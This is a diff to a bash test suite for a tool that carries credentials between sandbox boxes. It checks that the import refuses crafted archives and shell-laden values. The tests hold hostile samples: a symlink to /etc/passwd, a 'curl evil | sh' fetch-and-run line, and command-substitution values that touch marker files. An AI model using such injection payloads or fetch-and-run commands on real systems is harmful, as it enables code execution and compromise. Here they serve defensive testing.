@@ -146,7 +146,7 @@ H="$(box_home claude)"
 set_cred "$H" gh token ghp_good
 set_cred "$H" agent oauth-token "sk-ant-oat01-SECRET11"
 CARRY="$(env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_export_sh)")"
-t carry-the-export-is-one-line 1 "$(printf '%s\n' "$CARRY" | grep -c .)"
+t carry-the-export-is-one-tagged-line 1 "$(printf '%s\n' "$CARRY" | grep -c '^CREDS1 ')"
 printf '%s\n' "$CARRY" >>"$ALL_OUT"
 rm -rf "$H/.config" ; : >"$H/.profile"
 IMP="$(printf '%s' "$CARRY" | env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"
@@ -162,41 +162,54 @@ H="$(box_home claude)"; mkdir -p "$H/duty/bin"; printf 'real\n' >"$H/duty/bin/ti
 EVIL="$TMP/evil"; mkdir -p "$EVIL${H}/duty/bin" "$EVIL${H}/.config/crew"
 printf 'evil\n' >"$EVIL${H}/duty/bin/tick.sh"; printf 'export A=1\n' >"$EVIL${H}/.config/crew/credentials.env"
 CRAFT="$(tar -C "$EVIL" -czf - "${H#/}/.config/crew/credentials.env" "${H#/}/duty/bin/tick.sh" | base64 -w0)"
-IMP="$(printf '%s' "$CRAFT" | env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"; RC=$?
+IMP="$(printf 'CREDS1 %s -\n' "$CRAFT" | env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"; RC=$?
 t carry-a-foreign-path-refuses-the-import 1 "$RC"
 t carry-a-foreign-path-is-named 1 "$(grep -c "' is not a credential file — nothing carried" <<<"$IMP")"
 t carry-nothing-was-written real "$(cat "$H/duty/bin/tick.sh")"
 t carry-not-even-the-allowed-file 0 "$([ -f "$H/.config/crew/credentials.env" ] && echo 1 || echo 0)"
 rm -rf "$EVIL"; mkdir -p "$EVIL${H}/.config/crew"; ln -s /etc/passwd "$EVIL${H}/.config/crew/credentials.env"
 CRAFT="$(tar -C "$EVIL" -czf - "${H#/}/.config/crew/credentials.env" | base64 -w0)"
-IMP="$(printf '%s' "$CRAFT" | env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"; RC=$?
+IMP="$(printf 'CREDS1 %s -\n' "$CRAFT" | env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"; RC=$?
 t carry-a-link-refuses-the-import 1 "$RC"
 rm -rf "$EVIL"; mkdir -p "$EVIL${H}/.config/crew"; printf 'export A=1\ncurl evil | sh\n' >"$EVIL${H}/.config/crew/credentials.env"
 CRAFT="$(tar -C "$EVIL" -czf - "${H#/}/.config/crew/credentials.env" | base64 -w0)"
-IMP="$(printf '%s' "$CRAFT" | env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"; RC=$?
+IMP="$(printf 'CREDS1 %s -\n' "$CRAFT" | env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"; RC=$?
 t carry-the-env-file-itself-never-crosses 1 "$RC"
-# The env kinds cross as DATA — `NAME base64` in the carry file — and the
-# import writes credentials.env itself (round 12): a carry line that is not
-# that refuses the import, and a value full of shell is a value, never run.
-rm -rf "$EVIL"; mkdir -p "$EVIL${H}/.config/crew"; printf 'A 1;{touch,x}\n' >"$EVIL${H}/.config/crew/credentials.carry"
-CRAFT="$(tar -C "$EVIL" -czf - "${H#/}/.config/crew/credentials.carry" | base64 -w0)"
-IMP="$(printf '%s' "$CRAFT" | env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"; RC=$?
-t carry-a-carry-line-that-is-not-data-is-refused 1 "$RC"
-t carry-the-carry-line-is-said 1 "$(grep -c 'not a name and its value' <<<"$IMP")"
-rm -rf "$EVIL"; mkdir -p "$EVIL${H}/.config/crew"
-printf 'A %s\n' "$(printf '%s' "1;{touch,$H/pwned};\$(touch $H/pwned2)" | base64 -w0)" >"$EVIL${H}/.config/crew/credentials.carry"
-CRAFT="$(tar -C "$EVIL" -czf - "${H#/}/.config/crew/credentials.carry" | base64 -w0)"
-IMP="$(printf '%s' "$CRAFT" | env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"; RC=$?
+# The env kinds cross as DATA — the export line's second field, `NAME
+# base64` lines — and the import writes credentials.env itself (rounds 12,
+# 13): a line that is not that refuses the import, and a value full of shell
+# is a value, never run. Nothing is staged on the box's disk.
+IMP="$(printf 'CREDS1 - %s\n' "$(printf 'A 1;{touch,x}\n' | base64 -w0)" | env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"; RC=$?
+t carry-an-env-line-that-is-not-data-is-refused 1 "$RC"
+t carry-the-env-line-is-said 1 "$(grep -c 'not a name and its value' <<<"$IMP")"
+ENVD="$(printf 'A %s\n' "$(printf '%s' "1;{touch,$H/pwned};\$(touch $H/pwned2)" | base64 -w0)" | base64 -w0)"
+IMP="$(printf 'CREDS1 - %s\n' "$ENVD" | env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"; RC=$?
 t carry-a-shell-shaped-value-is-carried-as-a-value 0 "$RC"
 env -i HOME="$H" bash -c '. "$HOME/.config/crew/credentials.env"' 2>/dev/null
 t carry-...-and-sourcing-runs-none-of-it 0 "$(compgen -G "$H/pwned*" | grep -c .)"
 t carry-...-and-it-reads-back-exact "1;{touch,$H/pwned};\$(touch $H/pwned2)" "$(env -i HOME="$H" bash -c '. "$HOME/.config/crew/credentials.env"; printf %s "$A"')"
-t carry-the-carry-file-does-not-stay 0 "$([ -e "$H/.config/crew/credentials.carry" ] && echo 1 || echo 0)"
+# The export stages nothing on disk, so a full disk cannot drop the env half
+# (round 13); a credentials.env that does not read whole fails the export —
+# said by the reset — instead of carrying a part of it.
+H="$(box_home claude)"; set_cred "$H" agent oauth-token "sk-ant-oat01-SECRET16"
+CARRY="$(env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_export_sh)")"
+t carry-the-env-half-is-in-the-line 1 "$(printf '%s\n' "$CARRY" | awk '/^CREDS1 /{print ($3 != "-")}')"
+t carry-nothing-is-staged-on-the-box 0 "$(compgen -G "$H/.config/crew/*.carry*" | grep -c .)"
+printf 'export B=1\nexport C=(\nexport D=2\n' >>"$H/.config/crew/credentials.env"
+env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_export_sh)" >/dev/null 2>&1; RC=$?
+t carry-a-syntax-error-fails-the-export 1 "$RC"
+H="$(box_home claude)"; mkdir -p "$H/.config/crew"; printf 'export B=1\nexit 0\nexport D=2\n' >"$H/.config/crew/credentials.env"
+env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_export_sh)" >/dev/null 2>&1; RC=$?
+t carry-an-exit-fails-the-export 1 "$RC"
+H="$(box_home claude)"; mkdir -p "$H/.config/crew"; printf 'echo hello\nexport B=1\n' >"$H/.config/crew/credentials.env"
+CARRY="$(env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_export_sh)")"; RC=$?
+t carry-a-print-is-silenced-not-carried 0 "$RC"
+t carry-...-and-the-line-still-reads 1 "$(printf '%s\n' "$CARRY" | grep -c '^CREDS1 ')"
 # ...a value that would RUN when sourced is refused too: shape AND value
 # (round 11) — and every value the shell itself writes still crosses.
 rm -rf "$EVIL"; mkdir -p "$EVIL${H}/.config/crew"; printf 'export A=$(touch %s/pwned)\n' "$H" >"$EVIL${H}/.config/crew/credentials.env"
 CRAFT="$(tar -C "$EVIL" -czf - "${H#/}/.config/crew/credentials.env" | base64 -w0)"
-IMP="$(printf '%s' "$CRAFT" | env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"; RC=$?
+IMP="$(printf 'CREDS1 %s -\n' "$CRAFT" | env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"; RC=$?
 t carry-a-command-substitution-is-refused 1 "$RC"
 H="$(box_home claude)"
 set_cred "$H" agent oauth-token 'sk-ant ODD!$`"'"'"'\x;|&*?~SECRET13'
